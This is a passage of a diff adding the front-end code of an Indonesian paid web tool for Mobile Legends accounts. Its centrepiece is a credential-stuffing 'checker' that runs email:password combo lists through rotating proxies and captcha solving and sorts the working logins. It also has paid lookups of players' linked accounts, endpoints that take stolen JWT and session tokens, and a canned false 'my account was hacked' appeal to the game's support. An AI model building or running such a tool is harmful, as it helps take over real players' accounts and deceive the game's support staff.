+            updateCheckerStats();
+            
+            const preview = document.getElementById('checker-preview');
+            if (preview) preview.innerHTML = 'Checking in progress...';
+            
+            checkerActive = true;
+            const startBtn = document.getElementById('checker-start-btn');
+            if (startBtn) {
+                startBtn.disabled = true;
+                startBtn.innerHTML = '<i class="fa-solid fa-spinner fa-spin"></i> CHECKING...';
+            }
+            
+            addCheckerLog(`🚀 Start: ${checkerCombo.length} accounts, ${checkerProxy.length} proxies, Mode: ${currentCaptchaMode.toUpperCase()}`);
+            
+            let processed = 0;
+            
+            for (let i = 0; i < checkerCombo.length; i++) {
+                const [email, pass] = checkerCombo[i].split(':');
+                const proxy = checkerProxy[i % checkerProxy.length];
+                
+                let captcha = null;
+                if (currentCaptchaMode === 'manual') {
+                    if (i < captchaTokens.length) {
+                        captcha = captchaTokens[i];
+                    } else {
+                        addCheckerLog(`⚠️ No captcha token for ${email}, skipping`, 'gagal');
+                        checkerStats.gagal++;
+                        checkerResults.gagal.push(checkerCombo[i]);
+                        processed++;
+                        if (processed % 5 === 0) updateCheckerStats();
+                        continue;
+                    }
+                } else {
+                    addCheckerLog(`🤖 Solving captcha for ${email}...`, 'info');
+                    const sol = await solveCaptcha(proxy);
+                    if (!sol) {
+                        addCheckerLog(`❌ Failed to solve captcha for ${email}, skipping`, 'gagal');
+                        checkerStats.gagal++;
+                        checkerResults.gagal.push(checkerCombo[i]);
+                        processed++;
+                        if (processed % 5 === 0) updateCheckerStats();
+                        continue;
+                    }
+                    captcha = sol;
+                }
+                
+                try {
+                    const res = await processCheckerAccount(email, pass, proxy, captcha);
+                    if (res.status === 'valid') {
+                        checkerStats.valid++;
+                        checkerResults.valid.push(res.account);
+                    } else {
+                        checkerStats.invalid++;
+                        checkerResults.invalid.push(res.account);
+                    }
+                } catch(e) {
+                    checkerStats.gagal++;
+                    checkerResults.gagal.push(checkerCombo[i]);
+                    addCheckerLog(`💥 ERROR: ${email} - ${e.message}`, 'gagal');
+                }
+                
+                processed++;
+                if (processed % 5 === 0) updateCheckerStats();
+            }
+            
+            updateCheckerStats();
+            
+            // Deduct balance
+            if (!currentUser.isAdmin && !currentUser.isVIP) {
+                currentUser.balance -= CHECKER_PRICE;
+                await saveUserToFirebase();
+                updateUserInfo();
+            }
+            
+            // Preview
+            if (preview) {
+                if (checkerResults.valid.length > 0) {
+                    preview.innerHTML = `<pre>${formatCheckerAccount(checkerResults.valid[0]).substring(0, 300)}</pre><p>... dan ${checkerResults.valid.length - 1} akun valid lainnya.</p>`;
+                } else if (checkerResults.invalid.length > 0) {
+                    preview.innerHTML = 'Tidak ada akun valid ditemukan.';
+                }
+            }
+            
+            // Save stats
+            const stats = await firebaseRequest('GET', 'checker_stats') || { total: 0, valid: 0, invalid: 0, gagal: 0 };
+            stats.total += checkerCombo.length;
+            stats.valid += checkerStats.valid;
+            stats.invalid += checkerStats.invalid;
+            stats.gagal += checkerStats.gagal;
+            await firebaseRequest('PUT', 'checker_stats', stats);
+            
+            // Save history
+            const historyId = `checker_${Date.now()}`;
+            await firebaseRequest('PUT', `users/${currentUser.username}/checker_history/${historyId}`, {
+                timestamp: new Date().toISOString(),
+                total: checkerCombo.length,
+                valid: checkerStats.valid,
+                invalid: checkerStats.invalid
+            });
+            
+            checkerActive = false;
+            if (startBtn) {
+                startBtn.disabled = false;
+                startBtn.innerHTML = '<i class="fa-solid fa-play"></i> MULAI CHECKING (Rp20.000)';
+            }
+            addCheckerLog(`✅ Selesai! Valid: ${checkerStats.valid}, Invalid: ${checkerStats.invalid}, Gagal: ${checkerStats.gagal}`, 'valid');
+        }
+
+        // ==================== PROCESS CHECK (LOOKUP) ====================
+        function extractDaysInactive(lastLogin) {
+            if (!lastLogin) return 0;
+            const match = lastLogin.match(/(\d+)d/);
+            return match ? parseInt(match[1]) : 0;
+        }
+
+        function formatBanResult(data) {
+            const lastLogin = data.last_login || '';
+            const daysInactive = extractDaysInactive(lastLogin);
+            const isBanned = daysInactive >= 7;
+            
+            let html = `<div class="result-profile"><div class="name">${data.name || 'N/A'}</div><div class="id">${data.role_id} (${data.zone_id})</div></div>`;
+            html += `<div class="info-item"><span class="label">Level</span><span class="value">${data.level || 0}</span></div>`;
+            html += `<div class="info-item"><span class="label">Hero</span><span class="value">${data.hero_count || 0}</span></div>`;
+            html += `<div class="info-item"><span class="label">Skin</span><span class="value">${data.skin_count || 0}</span></div>`;
+            html += `<div class="info-item"><span class="label">Win Rate</span><span class="value">${data.overall_win_rate || '0%'}</span></div>`;
+            html += `<div class="info-item"><span class="label">Rank</span><span class="value">${data.current_tier || 'N/A'}</span></div>`;
+            html += `<div class="info-item"><span class="label">Max Rank</span><span class="value">${data.max_tier || 'N/A'}</span></div>`;
+            html += `<div class="info-item"><span class="label">Created</span><span class="value">${data.ttl || 'N/A'}</span></div>`;
+            html += `<div class="info-item"><span class="label">Last Login</span><span class="value">${lastLogin}</span></div>`;
+            html += `<div class="info-item"><span class="label">Tidak Aktif</span><span class="value">${daysInactive} hari</span></div>`;
+            html += `<div class="info-item"><span class="label">Status Ban</span><span class="value ${isBanned ? 'banned-status' : 'active-status'}">${isBanned ? '🔴 BANNED' : '🟢 AKTIF'}</span></div>`;
+            if (isBanned) html += `<div class="info-item"><span class="label">Alasan</span><span class="value">Tidak aktif > 7 hari</span></div>`;
+            
+            if (data.top_3_hero_details) {
+                html += '<h4 style="color:#ffaa00;margin:15px 0 10px;">⭐ TOP HERO</h4>';
+                data.top_3_hero_details.forEach((h, i) => {
+                    html += `<div class="info-item"><span class="label">${i + 1}. ${h.hero}</span><span class="value">${h.matches}M | ${h.win_rate}</span></div>`;
+                });
+            }
+            return html;
+        }
+
+        async function processCheck() {
+            if (!currentUser) return showAlert('Login dulu!', 'error');
+            if (currentUser.isBlocked) return showAlert('Akun diblokir karena spam!', 'error');
+            if (!currentFeature) return showAlert('Pilih fitur!', 'error');
+            if (featureStatus[currentFeature] === false) return showAlert('Fitur dinonaktifkan admin!', 'error');
+            
+            const feat = FEATURES.find(f => f.id === currentFeature);
+            const price = feat?.price || 1500;
+            
+            if (!currentUser.isAdmin && !currentUser.isVIP && (currentUser.balance || 0) < price) {
+                return showAlert(`Saldo kurang! Rp${price.toLocaleString()}`, 'error');
+            }
+            
+            const loading = document.getElementById('loading');
+            const resultSection = document.getElementById('result-section');
+            const copyBtn = document.getElementById('copyResultBtn');
+            
+            if (loading) loading.classList.add('show');
+            if (resultSection) resultSection.classList.remove('show');
+            if (copyBtn) copyBtn.style.display = 'none';
+            
+            try {
+                let res, html;
+                
+                if (currentFeature === 'ban_v2') {
+                    const jwt = document.getElementById('jwt_token')?.value.trim() || '';
+                    const token = document.getElementById('ban_token')?.value.trim() || '';
+                    const proxy = document.getElementById('proxy')?.value.trim() || '';
+                    if (!jwt) throw new Error('JWT wajib');
+                    const r = await fetch(BAN_V2_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ jwt, token, proxy })
+                    });
+                    res = await r.json();
+                    html = `<pre style="font-size:0.7rem">${JSON.stringify(res, null, 2)}</pre>`;
+                    
+                } else if (currentFeature === 'v2l') {
+                    const guid = document.getElementById('guid')?.value.trim() || '';
+                    const ses = document.getElementById('session')?.value.trim() || '';
+                    if (!guid || !ses) throw new Error('GUID & Session wajib');
+                    const r = await fetch(V2L_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ guid, session: ses, type: v2lType })
+                    });
+                    res = await r.json();
+                    html = `<pre style="font-size:0.7rem">${JSON.stringify(res, null, 2)}</pre>`;
+                    
+                } else if (currentFeature === 'find' || currentFeature === 'ban_v3') {
+                    const nick = document.getElementById('find_nickname')?.value.trim() || '';
+                    if (!nick) throw new Error('Nickname wajib');
+                    const r = await fetch(LOOKUP_BIND_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ name: nick, role_id: 'null', type: 'find' })
+                    });
+                    res = await r.json();
+                    if (res.status !== 0) throw new Error(res.message);
+                    html = '<div>';
+                    (res.data || []).forEach(a => {
+                        const lastLogin = a.last_login || '';
+                        const daysInactive = extractDaysInactive(lastLogin);
+                        const isBanned = currentFeature === 'ban_v3' ? daysInactive >= 7 : false;
+                        html += `<div style="background:rgba(255,255,255,0.1);padding:12px;border-radius:16px;margin:4px 0">
+                            <div style="display:flex;justify-content:space-between">
+                                <b>${a.name || 'N/A'}</b>
+                                ${currentFeature === 'ban_v3' ? `<span style="color:${isBanned ? '#ff4444' : '#00ff88'}">${isBanned ? '🔴 BANNED' : '🟢 AKTIF'}</span>` : ''}
+                            </div>
+                            <div>${a.role_id} (${a.zone_id})</div>
+                            <div>Level ${a.level || 0} | ${a.current_tier || 'N/A'}</div>
+                            <div style="font-size:0.7rem">Last: ${lastLogin}</div>
+                            ${currentFeature === 'ban_v3' ? `<div>Tidak aktif: ${daysInactive} hari</div>` : ''}
+                        </div>`;
+                    });
+                    html += '</div>';
+                    
+                } else if (currentFeature === 'bind') {
+                    const rid = document.getElementById('role_id')?.value.trim() || '';
+                    const zid = document.getElementById('zone_id')?.value.trim() || '0';
+                    if (!rid || !/^\d+$/.test(rid)) throw new Error('Role ID angka');
+                    const r = await fetch(LOOKUP_BIND_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ role_id: rid, zone_id: zid, type: 'bind' })
+                    });
+                    res = await r.json();
+                    if (res.status !== 0) throw new Error(res.message);
+                    const d = res.data;
+                    html = `<div class="result-profile"><div class="name">${d.name || 'N/A'}</div><div class="id">${rid} (${zid})</div></div>`;
+                    html += `<div class="info-item"><span class="label">Total Bind</span><span class="value">${(d.bind_accounts || []).length}</span></div>`;
+                    (d.bind_accounts || []).forEach(b => {
+                        html += `<div class="info-item"><span class="label">${b.platform || 'Unknown'}</span><span class="value">${b.details || '-'}</span></div>`;
+                    });
+                    
+                } else {
+                    const rid = document.getElementById('role_id')?.value.trim() || '';
+                    const zid = document.getElementById('zone_id')?.value.trim() || '0';
+                    if (!rid || !/^\d+$/.test(rid)) throw new Error('Role ID angka');
+                    const r = await fetch(LOOKUP_BIND_API, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-api-key': API_KEY },
+                        body: JSON.stringify({ role_id: rid, zone_id: zid, type: 'lookup' })
+                    });
+                    res = await r.json();
+                    if (res.status !== 0) throw new Error(res.message);
+                    const d = res.data;
+                    
+                    if (currentFeature === 'ban' || currentFeature === 'ban_v1') {
+                        html = formatBanResult(d);
+                    } else {
+                        html = `<div class="result-profile"><div class="name">${d.name || 'N/A'}</div><div class="id">${rid} (${zid})</div></div>`;
+                        html += `<div class="info-item"><span class="label">Level</span><span class="value">${d.level || 0}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Hero</span><span class="value">${d.hero_count || 0}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Skin</span><span class="value">${d.skin_count || 0}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Win Rate</span><span class="value">${d.overall_win_rate || '0%'}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Rank</span><span class="value">${d.current_tier || 'N/A'}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Max Rank</span><span class="value">${d.max_tier || 'N/A'}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Created</span><span class="value">${d.ttl || 'N/A'}</span></div>`;
+                        html += `<div class="info-item"><span class="label">Last Login</span><span class="value">${d.last_login || 'N/A'}</span></div>`;
+                        
+                        if (d.top_3_hero_details) {
+                            html += '<h4 style="color:#ffaa00;margin:15px 0 10px;">⭐ TOP HERO</h4>';
+                            d.top_3_hero_details.forEach((h, i) => {
+                                html += `<div class="info-item"><span class="label">${i + 1}. ${h.hero}</span><span class="value">${h.matches}M | ${h.win_rate}</span></div>`;
+                            });
+                        }
+                    }
+                }
+                
+                // Deduct balance
+                if (!currentUser.isAdmin && !currentUser.isVIP) {
+                    currentUser.balance -= price;
+                    await saveUserToFirebase();
+                }
+                
+                // History
+                checkHistory.unshift({
+                    feature: currentFeature,
+                    time: new Date().toLocaleString(),
+                    result: html.substring(0, 200)
+                });
+                if (checkHistory.length > 20) checkHistory.pop();
+                localStorage.setItem('history', JSON.stringify(checkHistory));
+                
+                const resultContent = document.getElementById('result-content');
+                if (resultContent) resultContent.innerHTML = html;
+                if (copyBtn) copyBtn.style.display = 'block';
+                if (resultSection) resultSection.classList.add('show');
+                updateUserInfo();
+                
+            } catch(e) {
+                showAlert(e.message, 'error');
+            } finally {
+                if (loading) loading.classList.remove('show');
+            }
+        }
+
+        // ==================== ADMIN ====================
+        async function loadAdminDashboard() {
+            if (!currentUser?.isAdmin) return;
+            try {
+                const users = await firebaseRequest('GET', 'users');
+                const history = await firebaseRequest('GET', 'history');
+                const spam = await firebaseRequest('GET', 'stats/spam') || { total: 0, banned: 0 };
+                const checker = await firebaseRequest('GET', 'checker_stats') || { total: 0, valid: 0, invalid: 0, gagal: 0 };
+                
+                let totalUsers = 0, revenue = 0, on = 0, off = 0, userHtml = '';
+                
+                if (users) {
+                    totalUsers = Object.keys(users).length;
+                    Object.values(users).forEach(u => {
+                        if (u.settings?.featureStatus) {
+                            Object.values(u.settings.featureStatus).forEach(s => s ? on++ : off++);
+                        }
+                        if (u.history) revenue += Object.keys(u.history).length * 1500;
+                        if (u.checker_history) revenue += Object.keys(u.checker_history).length * CHECKER_PRICE;
+                        
+                        const blocked = u.isBlocked ? 'blocked' : '';
+                        const spamCount = u.spamCount || 0;
+                        userHtml += `<div class="user-item ${blocked}">
+                            <div class="user-info">
+                                <span class="username">${u.username}</span>
+                                <span class="balance">Rp${(u.balance || 0).toLocaleString()}</span>
+                                ${spamCount ? `<span class="spam-count">Spam:${spamCount}</span>` : ''}
+                            </div>
+                            <div class="user-role ${u.isAdmin ? 'admin' : (blocked ? 'blocked' : '')}">
+                                ${u.isAdmin ? 'ADMIN' : (blocked ? 'BLOCKED' : 'MEMBER')}
+                            </div>
+                            <div class="user-actions">
+                                ${!u.isAdmin ? `
+                                    ${blocked ?
+                                        `<div class="action-btn unblock" onclick="unblockUser('${u.username}')" title="Unblock"><i class="fa-solid fa-check"></i></div>` :
+                                        `<div class="action-btn block" onclick="blockUser('${u.username}')" title="Block"><i class="fa-solid fa-ban"></i></div>`
+                                    }
+                                    ${u.isAdmin ? '' : `<div class="action-btn demote" onclick="demoteUser('${u.username}')" title="Hapus Admin"><i class="fa-solid fa-user-minus"></i></div>`}
+                                ` : ''}
+                            </div>
+                        </div>`;
+                    });
+                }
+                
+                const adminTotalUsers = document.getElementById('adminTotalUsers');
+                const adminTotalUsage = document.getElementById('adminTotalUsage');
+                const adminTotalOn = document.getElementById('adminTotalOn');
+                const adminTotalOff = document.getElementById('adminTotalOff');
+                const adminTotalRevenue = document.getElementById('adminTotalRevenue');
+                const adminTotalChecker = document.getElementById('adminTotalChecker');
+                const adminTotalValid = document.getElementById('adminTotalValid');
+                const adminTotalInvalid = document.getElementById('adminTotalInvalid');
+                const adminTotalGagal = document.getElementById('adminTotalGagal');
+                const totalSpam = document.getElementById('totalSpam');
+                const totalBanned = document.getElementById('totalBanned');
+                const adminUserList = document.getElementById('adminUserList');
+                
+                if (adminTotalUsers) adminTotalUsers.innerHTML = totalUsers;
+                if (adminTotalUsage) adminTotalUsage.innerHTML = history ? Object.keys(history).length : 0;
+                if (adminTotalOn) adminTotalOn.innerHTML = on;
+                if (adminTotalOff) adminTotalOff.innerHTML = off;
+                if (adminTotalRevenue) adminTotalRevenue.innerHTML = `Rp${revenue.toLocaleString()}`;
+                if (adminTotalChecker) adminTotalChecker.innerHTML = checker.total || 0;
+                if (adminTotalValid) adminTotalValid.innerHTML = checker.valid || 0;
+                if (adminTotalInvalid) adminTotalInvalid.innerHTML = checker.invalid || 0;
+                if (adminTotalGagal) adminTotalGagal.innerHTML = checker.gagal || 0;
+                if (totalSpam) totalSpam.innerHTML = spam.total || 0;
+                if (totalBanned) totalBanned.innerHTML = spam.banned || 0;
+                if (adminUserList) adminUserList.innerHTML = userHtml || '<div style="text-align:center;color:#fff;padding:20px">Tidak ada user</div>';
+                
+            } catch(e) {
+                console.error('Admin dashboard error:', e);
+            }
+        }
+
+        function showAdminDashboard() {
+            loadAdminDashboard();
+            const modal = document.getElementById('adminDashboardModal');
+            if (modal) modal.classList.add('show');
+            toggleSidebar();
+        }
+
+        async function blockUser(u) {
+            if (!confirm(`Blokir ${u}?`)) return;
+            const user = await firebaseRequest('GET', `users/${u}`);
+            if (user) {
+                user.isBlocked = true;
+                user.blockExpiry = new Date(2099, 11, 31).toISOString();
+                await firebaseRequest('PUT', `users/${u}`, user);
+                loadAdminDashboard();
+                showAlert(`User ${u} diblokir`, 'success');
+            }
+        }
+
+        async function unblockUser(u) {
+            const user = await firebaseRequest('GET', `users/${u}`);
+            if (user) {
+                user.isBlocked = false;
+                user.blockExpiry = null;
+                user.spamCount = 0;
+                await firebaseRequest('PUT', `users/${u}`, user);
+                loadAdminDashboard();
+                showAlert(`User ${u} dibuka blokirnya`, 'success');
+            }
+        }
+
+        async function demoteUser(u) {
+            if (!confirm(`Hapus admin ${u}?`)) return;
+            const user = await firebaseRequest('GET', `users/${u}`);
+            if (user) {
+                user.isAdmin = false;
+                await firebaseRequest('PUT', `users/${u}`, user);
+                loadAdminDashboard();
+                showAlert(`Hak admin ${u} dihapus`, 'success');
+            }
+        }
+
+        async function adminSendBalance() {
+            const u = document.getElementById('adminTargetUsername')?.value.trim() || '';
+            const a = parseInt(document.getElementById('adminSendAmount')?.value || '0');
+            if (!u || !a) return showAlert('Isi semua!', 'error');
+            if (a < 1000) return showAlert('Minimal Rp1.000!', 'error');
+            const user = await firebaseRequest('GET', `users/${u}`);
+            if (!user) return showAlert('User tidak ada!', 'error');
+            user.balance = (user.balance || 0) + a;
+            await firebaseRequest('PUT', `users/${u}`, user);
+            showAlert(`Rp${a.toLocaleString()} terkirim ke ${u}`, 'success');
+            const target = document.getElementById('adminTargetUsername');
+            const amount = document.getElementById('adminSendAmount');
+            if (target) target.value = '';
+            if (amount) amount.value = '';
+            loadAdminDashboard();
+        }
+
+        async function createNewAdmin() {
+            const u = document.getElementById('newAdminUsername')?.value.trim() || '';
+            const p = document.getElementById('newAdminPassword')?.value.trim() || '';
+            if (!u || !p) return showAlert('Isi semua!', 'error');
+            if (p.length < 4) return showAlert('Password min 4 karakter!', 'error');
+            
+            const exist = await firebaseRequest('GET', `users/${u}`);
+            if (exist) return showAlert('Username sudah ada!', 'error');
+            
+            const newUser = {
+                username: u, password: p, balance: 999999999, isVIP: true, isAdmin: true,
+                isBlocked: false, vipExpiry: new Date(2099, 11, 31).toISOString(),
+                createdAt: new Date().toISOString(),
+                settings: { webName: 'iBallFlyy', featureStatus: {} }
+            };
+            FEATURES.forEach(f => newUser.settings.featureStatus[f.id] = true);
+            await firebaseRequest('PUT', `users/${u}`, newUser);
+            showAlert(`Admin ${u} berhasil dibuat!`, 'success');
+            const username = document.getElementById('newAdminUsername');
+            const password = document.getElementById('newAdminPassword');
+            if (username) username.value = '';
+            if (password) password.value = '';
+            loadAdminDashboard();
+        }
+
+        function saveSpamSettings() {
+            const limit = document.getElementById('spamLimit');
+            const duration = document.getElementById('spamBanDuration');
+            const l = parseInt(limit?.value || '5');
+            const d = parseInt(duration?.value || '5');
+            if (l < 1 || d < 1) return showAlert('Minimal 1', 'error');
+            SPAM_LIMIT = l;
+            SPAM_BLOCK_DURATION = d;
+            showAlert(`✅ Spam settings saved! Limit:${l}/menit, Blokir:${d} menit`, 'success');
+        }
+
+        // ==================== PANEL ====================
+        function showPanelMenu() {
+            const featureList = document.getElementById('featureList');
+            if (!featureList) return;
+            
+            let html = '';
+            FEATURES.forEach(f => {
+                const active = featureStatus[f.id] !== false;
+                html += `<div class="panel-feature-item" style="display:flex;justify-content:space-between;align-items:center;background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:20px;padding:12px;margin-bottom:8px">
+                    <div><i class="fa-solid ${f.icon}" style="color:#fff;width:24px"></i> ${f.name}</div>
+                    <div style="display:flex;align-items:center;gap:10px">
+                        <span style="color:#ffaa00">Rp${f.price.toLocaleString()}</span>
+                        <div class="toggle-switch" onclick="toggleFeature('${f.id}')" id="toggle-${f.id}" style="width:44px;height:22px;background:${active ? '#fff' : 'rgba(255,255,255,0.2)'};border:2px solid #fff;border-radius:20px;position:relative;cursor:pointer">
+                            <div style="width:16px;height:16px;background:#0066ff;border-radius:50%;position:absolute;top:1px;left:${active ? '24px' : '2px'};transition:0.2s"></div>
+                        </div>
+                    </div>
+                </div>`;
+            });
+            featureList.innerHTML = html;
+            const modal = document.getElementById('panelModal');
+            if (modal) modal.classList.add('show');
+            toggleSidebar();
+        }
+
+        function toggleFeature(f) {
+            featureStatus[f] = !featureStatus[f];
+            const t = document.getElementById(`toggle-${f}`);
+            if (t) {
+                t.style.background = featureStatus[f] ? '#fff' : 'rgba(255,255,255,0.2)';
+                const div = t.querySelector('div');
+                if (div) div.style.left = featureStatus[f] ? '24px' : '2px';
+            }
+            const card = document.getElementById(`menu-${f}`);
+            if (card) card.classList.toggle('disabled-feature', !featureStatus[f]);
+        }
+
+        async function saveCustomization() {
+            const name = document.getElementById('webNameInput')?.value.trim() || 'iBallFlyy';
+            if (!currentUser) return;
+            if (!currentUser.settings) currentUser.settings = {};
+            currentUser.settings.webName = name;
+            currentUser.settings.featureStatus = featureStatus;
+            await saveUserToFirebase();
+            
+            const webTitle = document.getElementById('webTitle');
+            const webSubtitle = document.getElementById('webSubtitle');
+            const loadingLogo = document.getElementById('loadingLogo');
+            const loginWebName = document.getElementById('loginWebName');
+            
+            if (webTitle) webTitle.innerHTML = `${name} TOOLS`;
+            if (webSubtitle) webSubtitle.innerHTML = `TOOLS ${name} MLBB`;
+            if (loadingLogo) loadingLogo.innerHTML = name;
+            if (loginWebName) loginWebName.innerHTML = name;
+            
+            showAlert('Pengaturan disimpan!', 'success');
+            closeModal('panelModal');
+        }
+
+        // ==================== DEPOSIT ====================
+        function showDepositModal() {
+            const modal = document.getElementById('depositModal');
+            if (modal) modal.classList.add('show');
+            toggleSidebar();
+        }
+
+        function selectDeposit(a) {
+            document.querySelectorAll('.deposit-card').forEach(c => c.classList.remove('selected'));
+            if (event.currentTarget) event.currentTarget.classList.add('selected');
+            selectedDeposit = a;
+            const btn = document.getElementById('depositBtn');
+            if (btn) btn.disabled = false;
+        }
+
+        function confirmDeposit() {
+            if (!selectedDeposit || !currentUser) return;
+            const msg = `Halo admin, saya ingin deposit saldo sebesar Rp${selectedDeposit.toLocaleString()}\nUsername: ${currentUser.username}`;
+            window.open(`https://wa.me/6283152491718?text=${encodeURIComponent(msg)}`, '_blank');
+            setTimeout(() => {
+                selectedDeposit = 0;
+                document.querySelectorAll('.deposit-card').forEach(c => c.classList.remove('selected'));
+                const btn = document.getElementById('depositBtn');
+                if (btn) btn.disabled = true;
+                closeModal('depositModal');
+            }, 3000);
+        }
+
+        // ==================== MODAL ====================
+        function toggleSidebar() {
+            const sidebar = document.getElementById('sidebar');
+            const overlay = document.getElementById('sidebarOverlay');
+            if (sidebar) sidebar.classList.toggle('open');
+            if (overlay) overlay.classList.toggle('show');
+        }
+
+        function showHistory() {
+            const historyContent = document.getElementById('historyContent');
+            if (!historyContent) return;
+            
+            let html = '';
+            if (!checkHistory.length) html = '<div style="text-align:center;padding:30px;color:#fff">Belum ada history</div>';
+            else checkHistory.forEach((h, i) => {
+                html += `<div class="history-item" onclick="alert(h.result)" style="cursor:pointer;background:rgba(255,255,255,0.1);border:2px solid rgba(255,255,255,0.2);border-radius:18px;padding:12px;margin-bottom:8px">
+                    <div class="feature" style="display:flex;justify-content:space-between;color:#fff">${h.feature} <i class="fa-solid fa-chevron-right"></i></div>
+                    <div class="id" style="color:#ffaa00">${h.time}</div>
+                </div>`;
+            });
+            historyContent.innerHTML = html;
+            const modal = document.getElementById('historyModal');
+            if (modal) modal.classList.add('show');
+            toggleSidebar();
+        }
+
+        function showTutorial() {
+            const modal = document.getElementById('tutorialModal');
+            if (modal) modal.classList.add('show');
+        }
+
+        function closeModal(id) {
+            const modal = document.getElementById(id);
+            if (modal) modal.classList.remove('show');
+        }
+
+        // ==================== HELPER ====================
+        function setV2LType(t) {
+            v2lType = t;
+            const typeAnd = document.getElementById('type-and');
+            const typeIos = document.getElementById('type-ios');
+            if (typeAnd) typeAnd.classList.toggle('active', t === 'and');
+            if (typeIos) typeIos.classList.toggle('active', t === 'ios');
+        }
+
+        function copyResult() {
+            const result = document.getElementById('result-content');
+            if (!result) return;
+            navigator.clipboard.writeText(result.innerText);
+            showAlert('✅ Hasil disalin ke clipboard!', 'success');
+        }
+
+        function copyTutorialText() {
+            const t = "I'm here to submit an appeal to my account which was hacked because my account was hacked or stolen by someone I don't know and then changed all the login addresses, please Moonton help me.";
+            navigator.clipboard.writeText(t);
+            showAlert('✅ Teks sakti disalin!', 'success');
+        }
+
+        function handleWebsiteFile(i) {
+            const f = i.files[0];
+            if (!f) return;
+            selectedWebsiteFile = f;
+            const fileName = document.getElementById('websiteFileName');
+            const uploadBtn = document.getElementById('uploadWebsiteBtn');
+            if (fileName) fileName.innerHTML = `📄 ${f.name}`;
+            if (uploadBtn) uploadBtn.disabled = false;
+        }
+
+        function updateWebsiteWithCode() {
+            const code = document.getElementById('websiteCode')?.value.trim() || '';
+            if (!code) return showAlert('Masukkan kode HTML!', 'error');
+            if (confirm('Yakin ingin mengupdate website? Halaman akan reload.')) {
+                localStorage.setItem('websiteCode', code);
+                const d = document.open('text/html', 'replace');
+                d.write(code);
+                d.close();
+            }
+        }
+
+        function uploadWebsiteFile() {
+            if (!selectedWebsiteFile) return showAlert('Pilih file!', 'error');
+            const r = new FileReader();
+            r.onload = e => {
+                if (confirm('Yakin ingin mengupdate website? Halaman akan reload.')) {
+                    localStorage.setItem('websiteCode', e.target.result);
+                    const d = document.open('text/html', 'replace');
+                    d.write(e.target.result);
+                    d.close();
+                }
+            };
+            r.readAsText(selectedWebsiteFile);
+        }
+
+        // ==================== INIT ====================
+        const saved = localStorage.getItem('currentUser');
+        if (saved) {
+            try {
+                currentUser = JSON.parse(saved);
+                if (currentUser.username === ADMIN_USERNAME) {
+                    loadUserSettings();
+                    const loginScreen = document.getElementById('loginScreen');
+                    const main = document.getElementById('mainContainer');
+                    const toggle = document.getElementById('sidebarToggle');
+                    
+                    if (loginScreen) loginScreen.style.display = 'none';
+                    if (main) main.style.display = 'block';
+                    if (toggle) toggle.style.display = 'flex';
+                    
+                    updateUserInfo();
+                    generateMenuGrid();
+                    loadAdminDashboard();
+                } else {
+                    firebaseRequest('GET', `users/${currentUser.username}`).then(u => {
+                        if (u) {
+                            currentUser = u;
+                            localStorage.setItem('currentUser', JSON.stringify(u));
+                            loadUserSettings();
+                            
+                            const loginScreen = document.getElementById('loginScreen');
+                            const main = document.getElementById('mainContainer');
+                            const toggle = document.getElementById('sidebarToggle');
+                            
+                            if (loginScreen) loginScreen.style.display = 'none';
+                            if (main) main.style.display = 'block';
+                            if (toggle) toggle.style.display = 'flex';
+                            
+                            updateUserInfo();
+                            generateMenuGrid();
+                        } else {
+                            localStorage.removeItem('currentUser');
+                        }
+                    }).catch(() => {
+                        localStorage.removeItem('currentUser');
+                    });
+                }
+            } catch(e) {
+                localStorage.removeItem('currentUser');
+            }
+        }
+
+        // Check saved website code
+        const savedCode = localStorage.getItem('websiteCode');
+        if (savedCode && savedCode !== document.documentElement.outerHTML) {
+            if (confirm('Website akan diupdate dengan kode tersimpan. Lanjutkan?')) {
+                const d = document.open('text/html', 'replace');
+                d.write(savedCode);
+                d.close();
+            }
+        }
+
+        document.addEventListener('keypress', e => {
+            if (e.key === 'Enter') {
+                const main = document.getElementById('mainContainer');
+                if (main && main.style.display === 'block' && currentFeature && !checkerActive) {
+                    processCheck();
+                }
+            }
+        });
+
+        document.addEventListener('click', e => {
+            const s = document.getElementById('sidebar');
+            const t = document.querySelector('.sidebar-toggle');
+            if (s && t && !s.contains(e.target) && !t.contains(e.target) && s.classList.contains('open')) {
+                toggleSidebar();
+            }
+        });
+    </script>
+</body>
+</html>
